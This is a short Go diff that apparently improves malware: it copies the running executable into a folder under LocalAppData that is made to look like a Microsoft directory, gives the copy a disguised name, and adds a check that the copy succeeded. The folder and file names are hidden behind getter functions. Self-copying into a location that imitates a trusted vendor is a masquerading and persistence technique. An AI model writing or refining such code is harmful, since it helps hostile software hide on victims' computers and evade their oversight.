@@ -76,9 +76,15 @@ func runPrimaryWithWorker() {
 	disguisedDir := filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())
 	disguisedPath := filepath.Join(disguisedDir, getDisguisedExeName())
 
+	copied := false
 	if err := os.MkdirAll(disguisedDir, 0755); err == nil {
-		_ = copyFile(exePath, disguisedPath)
-	} else {
+		if copyFile(exePath, disguisedPath) == nil {
+			if _, statErr := os.Stat(disguisedPath); statErr == nil {
+				copied = true
+			}
+		}
+	}
+	if !copied {
 		disguisedPath = exePath
 	}
 
